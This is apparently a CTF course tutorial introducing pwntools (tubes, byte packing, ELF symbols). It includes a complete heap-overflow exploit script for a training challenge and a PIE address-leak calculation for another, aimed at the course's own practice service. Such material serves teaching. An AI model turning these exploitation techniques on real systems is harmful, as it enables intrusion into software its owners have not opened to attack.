# Bonus: A pwntools Primer — Full

**Tools:** python3, pwntools

A short tutorial, not a challenge, so it has no build/publish/deploy pipeline and no flag.
It teaches the parts of [pwntools](https://docs.pwntools.com/) the session needs, and is meant to be done before [`bonus-heap-mayhem`](../bonus-heap-mayhem), the one challenge that cannot be solved by hand.

## Why this exists

Most challenges in this session you can solve by typing into `nc`, or with the one-line `solve.sh` in each `solve/` directory.
Two things change that:

* An address in the payload has to be sent in the right byte order, which is awkward to type.
* `heap-mayhem` is a PIE: the address you need is different on every run, so you must *read a leaked value and compute from it live*. No fixed script of keystrokes can do that.

pwntools handles both: it is a Python library for talking to a program and building byte payloads.

## Tubes: one object for local and remote

A *tube* is a connection. The same methods work whether it is a local process or a network service:

```python
from pwn import *

io = process("./chall")                  # run and talk to a local binary
io = remote("141.85.224.106", 31012)     # talk to the deployed service
```

Reading and writing:

```python
io.recvuntil(b"Enter your choice: ")     # read until this text appears
line = io.recvline()                     # read one line
data = io.recvall(timeout=5)             # read everything until the program closes

io.send(b"abc")                          # send bytes, no newline
io.sendline(b"2")                        # send bytes plus a newline
io.sendlineafter(b"choice: ", b"2")      # recvuntil then sendline, in one call
io.interactive()                         # connect it to your keyboard
```

Everything is `bytes`: write `b"2"`, not `"2"`.

## Packing: numbers to bytes, in the right order

x86 is little-endian: the least significant byte goes first.
Write an address as digits and it comes out backwards, so let pwntools pack it:

```python
p64(0x401196)    # -> b"\x96\x11\x40\x00\x00\x00\x00\x00"   (64-bit)
p32(0x80491f6)   # -> b"\xf6\x91\x04\x08"                   (32-bit)

u64(b"\x96\x11\x40\x00\x00\x00\x00\x00")   # -> 0x401196    (bytes back to a number)
u32(b"\xf6\x91\x04\x08")                   # -> 0x80491f6
```

Build a payload by concatenating bytes:

```python
payload  = b"A" * 32          # filler to reach the neighbour
payload += p64(0x401196)      # the address to land on it
```

## Addresses from the ELF

```python
exe = ELF("chall", checksec=False)
win = exe.symbols["win"]                               # a function's address
bss = exe.get_section_by_name(".bss").header.sh_addr   # a section's address
```

For a non-PIE binary (`heap-0`..`heap-havoc`) these are the real runtime addresses.
For a PIE (`heap-mayhem`) they are *offsets from the load base*: recover the base from a leak, then add the offset.

## A full worked example: heap-2 in pwntools

`03-cylab-heap-2` needs exactly one packed address, so it is the ideal first script.
The bug: overflowing `input_data` by 32 bytes reaches the buffer `x`, and `check_win()` calls the 4-byte value it finds there as a function. Put `win()`'s address there.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("chall", checksec=False)

io = process("./chall")                 # local; swap for remote(...) below
# io = remote("141.85.224.106", 31012)

io.recvuntil(b"Enter your choice: ")
io.sendline(b"2")                       # write to buffer
io.recvuntil(b"Data for buffer: ")
io.sendline(b"A" * 32 + p64(exe.symbols["win"]))

io.recvuntil(b"Enter your choice: ")
io.sendline(b"4")                       # check_win() calls *x

print(io.recvall(timeout=5).decode(errors="replace"))
```

Run it against the local binary, then change `process("./chall")` to `remote("141.85.224.106", 31012)` and run it again.
The reference is [`03-cylab-heap-2/solve/exploit.py`](../03-cylab-heap-2/solve/exploit.py), which wires the local/remote choice to `args.REMOTE` so one file does both:

```console
python3 exploit.py                                        # local ./chall
python3 exploit.py REMOTE HOST=141.85.224.106 PORT=31012  # remote
```

## Where this leads: leaking under PIE

`heap-mayhem` adds the step this primer is really for.
The program prints a live function pointer; your script reads it, subtracts that function's known offset to get the load base, adds the target function's offset, and only then builds the overflow:

```python
leaked = int(row.split()[-1], 16)            # read the printed pointer
base   = leaked - exe.symbols["default_audit"]
secret = base + exe.symbols["secret_audit"]
payload = b"C" * distance + p64(secret)      # distance measured at runtime
```

That read-then-compute is exactly what a fixed sequence of keystrokes cannot do, and why pwntools is required there.
See [`bonus-heap-mayhem/README.md`](../bonus-heap-mayhem/README.md).

## References

* [pwntools documentation](https://docs.pwntools.com/)
* [pwntools tubes](https://docs.pwntools.com/en/stable/tubes.html)
* [pwntools packing helpers](https://docs.pwntools.com/en/stable/util/packing.html)
* [pwntools ELF](https://docs.pwntools.com/en/stable/elf/elf.html)
